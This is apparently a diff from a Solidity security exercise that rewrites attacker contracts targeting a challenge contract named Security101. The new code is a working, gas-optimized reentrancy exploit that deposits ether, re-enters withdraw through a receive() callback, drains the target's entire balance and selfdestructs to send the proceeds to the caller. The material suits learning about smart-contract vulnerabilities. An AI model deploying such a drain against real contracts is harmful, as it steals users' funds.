@@ -18,32 +18,30 @@ contract Security101 {
     }
 }
 
+// https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
+// in order to `receive` callback, we have to add a new contract and attack outside constructor
 contract AttackerMiddle {
-    Security101 token;
-    bool i;
-    constructor(Security101 _token) payable {
-        token = _token;
-    }
+    constructor() payable {}
 
-    function attack(address to) external {
-        token.deposit{value: 1 ether}();
-        token.withdraw(1 ether);
-        token.withdraw(9999 ether);
-        payable(to).transfer(10001 ether);
+    function attack(Security101 token) external payable {
+        uint value = address(this).balance;
+        token.deposit{value: value}();
+        token.withdraw(value);
+        token.withdraw(address(token).balance);
+        selfdestruct(payable(msg.sender));
     }
 
     receive() external payable {
-        if (i == false) {
-            i = true;
-            token.withdraw(1 ether);
+        if (msg.value == address(this).balance) {
+            Security101(msg.sender).withdraw(msg.value);
         }
     }
 }
 
+// when selfdestruct, nothing would write to code, saving gas.
 contract OptimizedAttackerSecurity101 {
-    Security101 token;
     constructor(address _token) payable {
-        AttackerMiddle tmp = new AttackerMiddle{value: 1 ether}(Security101(_token));
-        tmp.attack(msg.sender);
+        new AttackerMiddle{value: msg.value}().attack(Security101(_token));
+        selfdestruct(payable(msg.sender));
     }
 }
